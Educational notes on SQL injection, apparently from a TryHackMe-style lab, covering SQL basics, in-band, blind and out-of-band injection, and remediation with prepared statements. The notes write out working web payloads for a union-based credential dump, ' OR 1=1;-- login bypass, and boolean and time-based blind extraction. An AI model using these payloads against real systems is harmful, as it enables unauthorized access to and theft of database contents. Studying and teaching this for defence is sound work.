# What is SQL Injection?

**SQL Injection (SQLi)** is a web application vulnerability where an attacker injects malicious SQL queries into input fields (URL parameters, forms, headers, etc.) that are used directly in database queries.

If user input is not properly validated or parameterized, an attacker can:

- Read sensitive data (usernames, passwords, card details, etc.)
- Modify or delete data
- Bypass authentication (login without valid credentials)
- Sometimes execute OS-level commands (depending on DB & environment)

---
# Databases & SQL – Quick Recap

### What is a Database?

A **database** is an organized collection of data, managed by a **DBMS (Database Management System)**.

- Common relational DBMS: **MySQL, PostgreSQL, SQL Server, SQLite, Oracle**
- Data is stored in **tables**

Example database: `shop`

- Tables: `users`, `products`, `orders`, etc.

### Tables, Columns, Rows

- **Table** = like an Excel sheet
- **Columns (fields)** = named attributes; have a **data type** (INT, VARCHAR, DATE, etc.)
- **Rows (records)** = actual data entries

Example table `users`:

| id | username | password   |
|----|----------|-----------|
| 1  | jon      | pass123   |
| 2  | admin    | p4ssword  |
| 3  | martin   | secret123 |

- `id` is often an **auto-increment primary key** (unique per row)
- `username` and `password` are strings

---

# Relational vs Non-Relational Databases

### Relational Database (SQL / RDBMS)

- Uses **tables, rows, columns**
- Relationships are made using **keys** (e.g. `user_id` in `orders` referencing `users.id`)
- Examples: MySQL, PostgreSQL, SQL Server, SQLite

### Non-Relational Database (NoSQL)

- Flexible schema (no fixed table structure)
- Stores data as documents, key-value pairs, graphs, etc.
- Examples: MongoDB, Cassandra, Elasticsearch

> For SQL Injection, we mainly focus on **relational databases** using SQL.

---

# Basic SQL Commands (with Examples)

All examples assume a `users` table:

```sql
id | username | password
-------------------------
1  | jon      | pass123
2  | admin    | p4ssword
3  | martin   | secret123
````

### SELECT – Read Data

#### Example 1: Select all columns, all rows

```sql
SELECT * FROM users;
```

Output:

|id|username|password|
|---|---|---|
|1|jon|pass123|
|2|admin|p4ssword|
|3|martin|secret123|

#### Example 2: Select specific columns

```sql
SELECT username, password FROM users;
```

Output:

|username|password|
|---|---|
|jon|pass123|
|admin|p4ssword|
|martin|secret123|

#### Example 3: LIMIT – Restrict number of rows

```sql
SELECT * FROM users LIMIT 1;
```

Returns only the first row:

|id|username|password|
|---|---|---|
|1|jon|pass123|

`LIMIT offset, count`:

- `LIMIT 1,1` → skip 1 row, return 1
    
- `LIMIT 2,1` → skip 2 rows, return 1
    

#### Example 4: WHERE – Filter rows

```sql
SELECT * FROM users WHERE username = 'admin';
```

```sql
SELECT * FROM users WHERE username != 'admin';
```

```sql
SELECT * FROM users
WHERE username = 'admin'
  AND password = 'p4ssword';
```

```sql
SELECT * FROM users
WHERE username = 'admin'
   OR username = 'jon';
```

### LIKE – Pattern Matching

The `%` symbol is a wildcard.

```sql
-- username starts with 'a'
SELECT * FROM users WHERE username LIKE 'a%';

-- username ends with 'n'
SELECT * FROM users WHERE username LIKE '%n';

-- username contains 'mi'
SELECT * FROM users WHERE username LIKE '%mi%';
```

### UNION – Combine Results

`UNION` combines results of multiple `SELECT` queries.

Rules:

- Same number of columns
    
- Similar data types
    
- Same column order
    

Example:

```sql
SELECT name, address, city, postcode FROM customers
UNION
SELECT company, address, city, postcode FROM suppliers;
```

Result: one combined list of addresses from both tables.

### INSERT – Add Data

```sql
INSERT INTO users (username, password)
VALUES ('bob', 'password123');
```

Now the table:

|id|username|password|
|---|---|---|
|1|jon|pass123|
|2|admin|p4ssword|
|3|martin|secret123|
|4|bob|password123|

### UPDATE – Modify Data

```sql
UPDATE users
SET username = 'root', password = 'pass123'
WHERE username = 'admin';
```

Updated table:

|id|username|password|
|---|---|---|
|1|jon|pass123|
|2|root|pass123|
|3|martin|secret123|
|4|bob|password123|

### DELETE – Remove Data

```sql
DELETE FROM users WHERE username = 'martin';
```

Now:

|id|username|password|
|---|---|---|
|1|jon|pass123|
|2|root|pass123|
|4|bob|password123|

Delete all rows:

```sql
DELETE FROM users;
```

>No `WHERE` = **everything** is deleted.

---

# How SQL Injection Happens

### Vulnerable Scenario

Blog URL:

```text
https://website.thm/blog?id=1
```

Backend query:

```sql
SELECT * FROM blog
WHERE id = 1 AND private = 0
LIMIT 1;
```

If the ID is taken **directly** from the URL:

```sql
id = <user input without validation>
```

Then an attacker can inject SQL.

### SQLi Example with `;--`

Attacker’s URL:

```text
https://website.thm/blog?id=2;--
```

Resulting query:

```sql
SELECT * FROM blog
WHERE id = 2;-- and private = 0 LIMIT 1;
```

- `;` ends the original query
    
- `--` starts a comment, so `and private = 0 LIMIT 1` is ignored
    

Effect: private post with `id = 2` is shown even if `private = 1`.

---

# Types of SQL Injection

1. **In-Band SQLi**
    
    - Same channel to inject and receive data (e.g., browser page)
        
    - Subtypes: **Error-Based**, **Union-Based**
        
2. **Blind SQLi**
    
    - No direct error messages / data; attacker infers from application behavior
        
    - Subtypes: **Boolean-Based**, **Time-Based**, **Auth Bypass**
        
3. **Out-of-Band SQLi**
    
    - Different channels: one to inject, one to receive exfiltrated data (e.g., HTTP/DNS back to attacker)
        

---

# In-Band SQLi

### Error-Based SQL Injection

Uses database error messages to learn:

- Number of columns
    
- Table names
    
- Column names
    
- DB version, DB name, etc.
    

**Detection trick:**

Add `'` or `"` in a parameter:

```text
?id=1'
```

If you see an error like:

```text
You have an error in your SQL syntax...
```

→ likely SQLi.

### Union-Based SQL Injection

Use `UNION SELECT` to append attacker-controlled row(s) to the result.

#### Step 1: Find Number of Columns

Start from URL:

```text
?id=1
```

Try:

```text
?id=1 UNION SELECT 1
?id=1 UNION SELECT 1,2
?id=1 UNION SELECT 1,2,3
```

When no error → correct number of columns (say 3).

To force our row to appear instead of the original, make first query return no rows:

```text
?id=0 UNION SELECT 1,2,3
```

Now you see `1`, `2`, `3` printed.

#### Step 2: Get Current Database Name

```text
?id=0 UNION SELECT 1,2,database()
```

Output: e.g. `sqli_one`

#### Step 3: List Tables (using `information_schema`)

```sql
0 UNION SELECT 1,2,
       GROUP_CONCAT(table_name)
FROM information_schema.tables
WHERE table_schema = 'sqli_one';
```

Possible result: `article,staff_users`

#### Step 4: List Columns of Interesting Table

```sql
0 UNION SELECT 1,2,
       GROUP_CONCAT(column_name)
FROM information_schema.columns
WHERE table_name = 'staff_users';
```

Result: `id,username,password`

#### Step 5: Dump Credentials

```sql
0 UNION SELECT 1,2,
       GROUP_CONCAT(username, ':', password SEPARATOR '<br>')
FROM staff_users;
```

You now see something like:

```text
martin:SuperSecretPass
admin:AnotherPass
```

---

# Blind SQL Injection – Authentication Bypass

### Concept

Vulnerable login query:

```sql
SELECT * FROM users
WHERE username = '%username%'
  AND password = '%password%'
LIMIT 1;
```

If the app only checks **“did this query return any row?”**, we can inject something that always evaluates to `TRUE`.

### Example Payload

Input:

- username: _(leave blank or anything)_
    
- password:
    
    ```sql
    ' OR 1=1;--
    ```
    

Resulting SQL:

```sql
SELECT * FROM users
WHERE username = ''
  AND password = '' OR 1=1;--
LIMIT 1;
```

`1=1` is always true → query returns at least one row → login bypassed.

---

# Blind SQL Injection – Boolean-Based

### Concept

We only get **true/false behavior**, such as:

- `{"taken": true}` / `{"taken": false}`
    
- Page changes vs stays the same
    
- Status code changes (200 vs 500)
    
- Some difference in content
    

Example endpoint:

```text
https://website.thm/checkuser?username=admin
```

Response:

```json
{"taken": true}     // admin exists
{"taken": false}    // other name doesn't
```

Backend query:

```sql
SELECT * FROM users
WHERE username = '%username%'
LIMIT 1;
```

### Find Number of Columns with UNION

Start with a non-existing username like `admin123`:

```text
username=admin123' UNION SELECT 1;--
username=admin123' UNION SELECT 1,2;--
username=admin123' UNION SELECT 1,2,3;--
```

When response flips to `{"taken": true}`, you’ve found the correct number of columns (e.g. 3).

### Determine Database Name Character by Character

Use `database()` and `LIKE`:

```text
username=admin123' UNION SELECT 1,2,3
WHERE database() LIKE '%';--
```

- `%` matches anything → returns `true`
    

Then test prefixes:

```text
username=admin123' UNION SELECT 1,2,3
WHERE database() LIKE 's%';--
```

If `taken = true`, DB name starts with `s`.  
Try `sq%`, `sql%`, `sqli%`, etc. until full name (e.g. `sqli_three`) is found.

### Enumerate Tables

Use `information_schema.tables`:

```text
username=admin123' UNION SELECT 1,2,3
FROM information_schema.tables
WHERE table_schema = 'sqli_three'
  AND table_name LIKE 'u%';--
```

If `true` → there is a table beginning with `u` (likely `users`).

Confirm:

```text
username=admin123' UNION SELECT 1,2,3
FROM information_schema.tables
WHERE table_schema = 'sqli_three'
  AND table_name = 'users';--
```

### Enumerate Columns

Use `information_schema.columns`:

```text
username=admin123' UNION SELECT 1,2,3
FROM information_schema.columns
WHERE table_schema = 'sqli_three'
  AND table_name = 'users'
  AND column_name LIKE 'u%';--
```

Avoid repeating found columns with `AND column_name != 'id'`, etc., to discover `id, username, password`.

### Extract Username and Password

Find valid username:

```text
username=admin123' UNION SELECT 1,2,3
FROM users
WHERE username LIKE 'a%';--
```

Eventually → `admin`.

Then find password for `admin`:

```text
username=admin123' UNION SELECT 1,2,3
FROM users
WHERE username='admin'
  AND password LIKE '3%';--
```

By testing characters, you reconstruct the password, e.g. `3845`.

---

# Blind SQL Injection – Time-Based

### Concept

No visible differences in page content or JSON, but we can measure **response time**.

We use functions like `SLEEP(n)`:

- If our condition is true → DB sleeps `n` seconds → response delayed
    
- If false → returns quickly
    

### Find Number of Columns

Payload examples:

```text
username=admin123' UNION SELECT SLEEP(5);--
username=admin123' UNION SELECT SLEEP(5),2;--
```

If there is a ~5 second delay → correct number of columns (e.g. 2).

### Example Condition with Time-Based

```text
username=admin123' UNION SELECT SLEEP(5),2
WHERE database() LIKE 'u%';--
```

- If DB name starts with `u` → response delayed
    
- If not → normal speed
    

By adjusting patterns and checking delays, you can enumerate DB name, tables, columns, and data just like Boolean-based SQLi, but using **time** as the feedback.

---

# Out-of-Band SQL Injection (OOB)

### Concept

- Injection is sent via one channel (e.g., HTTP request).
    
- Data is exfiltrated via another channel (e.g., **HTTP/DNS requests to attacker-controlled server**).
    

Typical flow:

1. Attacker sends SQLi payload that includes a function causing an outbound request from the DB server (e.g. load data from URL).
    
2. DB server makes a request to attacker’s server with embedded data (e.g. in query parameters / DNS).
    
3. Attacker captures the data from server logs.
    

OOB SQLi often relies on:

- Database-specific functions/features
    
- Network connectivity from DB server to internet or attacker-controlled host
    

---

# Preventing SQL Injection (Remediation)

### 12.1 Prepared Statements (Parameterized Queries) **Best Practice**

Instead of building queries with string concatenation:

Vulnerable (pseudo-PHP):

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['user'] .
         "' AND password = '" . $_POST['pass'] . "'";
```

Safe (using prepared statements):

```php
$stmt = $db->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$_POST['user'], $_POST['pass']]);
```

- The query structure is fixed.
    
- User input is sent as **parameters**, not executed as SQL.
    

### Input Validation

- Use **allow-lists** where possible (e.g. only digits for an ID).
    
- Reject or sanitize unexpected characters.
    
- For example, for `id` that should be numeric:
    
    - Check: `if (!ctype_digit($_GET['id'])) { reject(); }`
        

### Escaping User Input

If you absolutely must build a query dynamically (not recommended), escape special characters:

- `'` → `\'`
    
- `"` → `\"`
    
- `\` → `\\`
    

DB libraries usually provide functions, e.g. `mysqli_real_escape_string()` in PHP.

> Note: Escaping **reduces** risk but does not replace parameterized queries.

### Additional Defenses

- **Least privilege**: DB user used by the app should not be `root` and should have minimal permissions.
    
- **Disable detailed error messages** in production (log them internally but don’t show to users).
    
- **Web Application Firewall (WAF)** can block common payloads (but can be bypassed by skilled attackers).
    
- Regular **security testing** (manual pentesting, SAST/DAST tools).
    

---

# Summary

- SQL Injection happens when **untrusted user input** is directly embedded into SQL queries.
    
- Types:
    
    - **In-Band**: Error-based & Union-based (data visible in response)
        
    - **Blind**: Boolean-based & Time-based (data inferred by behavior / timing)
        
    - **Out-of-Band**: Uses external channels (HTTP/DNS) for exfiltration
        
- Prevention mainly relies on:
    
    - **Prepared statements / parameterized queries**
        
    - **Proper input validation**
        
    - **Escaping** where necessary
        
    - **Least privilege + safe error handling**
        
---
